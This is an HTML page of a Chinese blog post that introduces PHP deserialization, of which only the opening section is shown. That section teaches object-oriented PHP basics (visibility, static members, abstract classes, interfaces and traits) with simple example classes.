<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>Web_6_PHP反序列化 | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.github.io",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!0},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">Web_6_PHP反序列化</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2022-10-20 00:00:00</span> <span class="mobile">2022-10-20 00:00</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-04-20 21:05:15</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/Study/">Study</a>&nbsp;</li><li>| <a href="/tags/unserialize/">unserialize</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>9.2k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>39 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><h2 id="第一节-php基础、类与对象"><a href="#第一节-php基础、类与对象" class="headerlink" title="第一节 php基础、类与对象"></a>第一节 php基础、类与对象</h2><p>读文档类与对象</p><h3 id="0x1-php中的面向对象"><a href="#0x1-php中的面向对象" class="headerlink" title="0x1 php中的面向对象"></a>0x1 php中的面向对象</h3><p>在前面的课程中，我们使用的最小命令单元，是函数或者语言结构，我们可以通过某个函数（比如phpinfo）来执行某个操作，这种使用单独函数来完成特定功能的语言模式，我们叫做面向过程编程。面向过程编程方法的优势是代码简单，开发迅速，不足之处就是如果功能、逻辑、数据进行大量的增长，这时候，代码维护难度将会成倍的增加，扩展性、可移植性就大大降低。</p><p>于是以Java为代表的面向对象编程顺势而出，解决了复杂逻辑空间下的编码模式问题，php在最开始的纯面向过程逐步向面向对象模式改进，在保持其一贯的简单易学、编码快速的优势下，同向对象之间取得平衡。</p><h4 id="面向对象的思想"><a href="#面向对象的思想" class="headerlink" title="面向对象的思想"></a>面向对象的思想</h4><p>面向对象的设计思想主要有</p><ol><li>系统中一切事物皆为对象</li><li>对象是属性及其操作的封装体</li><li>对象可按其性质划分为类，对象成为类的实例</li><li>实例关系和继承关系是对象之间的静态关系</li><li>消息传递是对象之间动态联系的唯一形式，也是计算的唯一形式</li><li>方法是消息的序列</li></ol><h4 id="php面向对象的特点"><a href="#php面向对象的特点" class="headerlink" title="php面向对象的特点"></a>php面向对象的特点</h4><p>面向对象三大特征：<code>封装、继承、多态</code></p><h5 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h5><p>在面向对象的思路上，功能相似的函数集合在一起</p><p>将完成一个共同功能的函数集中起来就是聚类</p><h5 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h5><p>功能封装，数据封装，供内部各个方法使用</p><h5 id="隔离"><a href="#隔离" class="headerlink" title="隔离"></a>隔离</h5><p>调用对象从一个蓝图转换到一个可以使用的产品的过程叫做实例化</p><p>俩个实例之间的属性不能互相访问，在对象内部，也不能直接访问外部的变量。</p><h5 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h5><p>继承可以理解为对象的包含，在php中可以使用<code>extends</code>关键字继承类</p><h5 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h5><p>在php中是弱类型,在参数传递过程中,可以改变参数的对象类型,作为对象依然是可以传递进去,当同一个参数由不同对象实例传递,那么调用结果就实现不同的状态</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$var</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们有一个command类，她有一个run方法，会执行参数run方法，然后我们有两个其他对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$var</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rabbit</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;兔子跑了&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Script</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;脚本已启动&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Rabbit</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Script</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure><h3 id="0x2-类与对象"><a href="#0x2-类与对象" class="headerlink" title="0x2 类与对象"></a>0x2 类与对象</h3><h4 id="类的属性和方法权限"><a href="#类的属性和方法权限" class="headerlink" title="类的属性和方法权限"></a>类的属性和方法权限</h4><p>在php中，类的属性和方法权限有三个权限，分别为</p><ul><li>public</li><li>protected</li><li>private</li></ul><h5 id="public权限"><a href="#public权限" class="headerlink" title="public权限"></a>public权限</h5><p>被定义为公有类成员可以在任何地方被访问</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"><span class="variable">$command</span>-&gt;cmd=<span class="string">&quot;whoami&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里用箭头来指向类的属性，箭头之后，不需要$符号</p><p>也可以使用<code>var</code>来定义类属性,如果使用<code>var</code>定义则默认<code>public</code>权限</p><h5 id="protected权限"><a href="#protected权限" class="headerlink" title="protected权限"></a>protected权限</h5><p>被定义为受保护的类成员则可以被其自身以及其子类和父类访问</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animals</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getColor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;color</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>color</code>属性可以被子类继承并访问</p><h5 id="private权限"><a href="#private权限" class="headerlink" title="private权限"></a>private权限</h5><p>私有属性,只能在类自身中访问,其他位置不能访问,包括继承它的类</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animals</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//正确，类实例可以访问到自身的私有属性</span></span><br><span class="line"><span class="variable">$animal</span> = <span class="keyword">new</span> <span class="title class_">Animal</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$animal</span> -&gt;color;</span><br><span class="line"><span class="comment">//错误,子类实例不能访问父类私有属性</span></span><br><span class="line"><span class="variable">$human</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$human</span> -&gt;color;</span><br><span class="line"><span class="comment">//错误,子类实例调用不了父类的私有方法</span></span><br><span class="line"><span class="variable">$human</span>-&gt;<span class="title function_ invoke__">sleep</span>();</span><br></pre></td></tr></table></figure><h4 id="类的属性"><a href="#类的属性" class="headerlink" title="类的属性"></a>类的属性</h4><p>属性声明是由关键字public、protected或者private开头，然后跟一个普通的变量声明来组成。属性中的变量可以初始化，但初始化的值必须是常数，这里的常数是指PHP脚本在编译阶段时就可以得到其值，而不依赖于运行时的信息才能求值。</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;panda&quot;</span>; <span class="comment">#初始化</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="静态属性"><a href="#静态属性" class="headerlink" title="静态属性"></a>静态属性</h5><p>指不用实例化类对象，直接通过类名访问的属性或者方法</p><p>声明类属性或方法为静态，就可以不实例化类而直接访问。静态属性不能通过一个类已实例化的对象来访问(但静态方法可以)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//这里直接通过类名调用，不需要实例化</span></span><br><span class="line">    <span class="title class_">Animal</span>::<span class="title function_ invoke__">sleep</span>();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$color</span>;</span><br><span class="line">    <span class="comment">//使用双冒号指向静态属性</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">think</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="variable">$color</span>;</span><br><span class="line">    <span class="comment">//子类也可以直接访问到父类的静态方法</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="final属性"><a href="#final属性" class="headerlink" title="final属性"></a>final属性</h5><p>如果代码中有<code>final</code>关键字就不允许子类重写父类,如果子类强制重写父类就会报错</p><h4 id="类的分类"><a href="#类的分类" class="headerlink" title="类的分类"></a>类的分类</h4><p>前面我们定义类的时候,没有修饰,类也是可以有不同的修饰符号的</p><h5 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h5><p>使用<code>abstract</code>关键字定义抽象类</p><p>定义为抽象的类不能被实例化.任何一个类,如果它里面至少有一个方法是被声明为抽象的,那么这个类就必须被声明为抽象的.被定义为抽象的方法只是声明了其调用方式(参数),不能定义其具体的功能实现.</p><p>继承一个抽象类的时候,子类必须定义父类中的所有抽象方法;另外,这些方法的访问控制必须和父类中的一样(或者更为宽松).例如某个抽象方法被声明为受保护 的,那么子类中实现的方法就应该声明为受保护的或者公有的,而不能被定义为私有的.此外方法的调用方式必须匹配,即类型和所需参数数量必须一致.例如,子类定义了一个可选参数,而父类抽象方法的声明里没有,则两者的声明并无冲突.</p><p>🌰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">abstract</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;in bed&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;on tree&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Human</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>抽象类的作用是保证他的子类都有指定的共同方法,方便外部调用,而不关心内部的具体实现</p><p>总之:</p><ul><li>抽象类不能实例化,只能实例化子类</li><li>抽象类可以有具体方法,但至少应该有一个抽象方法</li><li>继承抽象类的子类必须实现抽象类的所有抽象方法</li></ul><h5 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h5><p>使用<code>interface</code>来定义,很像抽象类</p><p>使用接口(interface),可以指定某个类必须实现哪些方法,但不需要定义这些方法的具体内容.其中定义的所有的方法都是空的</p><p>接口中定义的所有方法都必须是公有的,这是接口的特性</p><p>要实现一个接口,使用<code>implements</code>操作符.类中必须实现接口中定义的所有方法,否则会报一个致命错误.类可以实现多个接口,用逗号来分隔多个接口的名称.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">a</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">b</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">c</span> <span class="keyword">extends</span> <span class="title">a</span> ,<span class="title">b</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span> <span class="keyword">implements</span> <span class="title">c</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">baz</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接口允许继承,实现接口,也允许实现多个接口</p><h5 id="trait"><a href="#trait" class="headerlink" title="trait"></a>trait</h5><p>PHP5.4起,PHP实现了一种代码复用的方法,为trait</p><p>Trait 是为类似php单继承语言而备用的一种代码复用机制.Trait 为了减少单继承语言的限制,使开发人员能够自由地在不同层次结构内独立的类中复用method. Trait 和 class组合的语义定义了一种减少复杂性的方式,避免传统多继承和Mixin类相关典型问题.</p><p>Trait 和 Class 相似,但仅仅旨在用细粒度和一致的方式来组合功能. 无法通过Trait 自身来实例化. 它为传统继承增加了水平特性的组合; 也就是说应用的几个Class之间不需要继承.</p><p>trait 是可以组合的,由多个trait构成一个新的trait</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SayHello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">World</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">SayWorld</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">HelloWorld</span></span>&#123;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">Hello</span>, <span class="title">World</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> </span>&#123;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">HelloWorld</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">MyHelloWorld</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; <span class="title function_ invoke__">SayHello</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; <span class="title function_ invoke__">SayWorld</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>trait配合接口或者抽象类</p><h5 id="匿名类"><a href="#匿名类" class="headerlink" 